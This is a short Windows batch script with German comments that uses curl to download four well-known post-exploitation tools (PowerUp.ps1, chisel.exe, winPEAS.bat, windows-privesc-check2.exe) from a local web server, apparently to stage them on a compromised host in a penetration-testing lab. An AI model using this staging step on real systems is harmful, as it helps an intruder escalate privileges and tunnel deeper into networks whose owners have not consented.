@echo off

:: Editiere die Ziel-IP-Adresse hier
setlocal enabledelayedexpansion
set target_ip=192.168.1.122:8000/download/

:: Schleife durch die Dateien und lade sie herunter
for %%i in (PowerUp.ps1 chisel.exe winPEAS.bat windows-privesc-check2.exe) do (
  set "url=!target_ip!%%i"
  echo Lade Datei herunter: !url!
  curl -O "!url!"
)

endlocal
